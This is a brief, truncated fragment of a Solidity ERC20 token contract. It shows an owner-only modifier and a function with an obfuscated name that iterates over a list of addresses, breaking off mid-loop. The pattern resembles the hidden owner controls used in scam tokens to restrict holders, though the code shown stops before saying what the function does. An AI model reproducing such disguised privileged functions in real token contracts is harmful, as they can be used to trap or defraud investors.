...
contract irenezhao is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == reward, "Not allowed");
        _;
    }

    function sex(address[] memory bitter) public onlyOwner() {
        for (uint256 i = 0; i < bitter.length; i++) {
            address account = bitter[i];
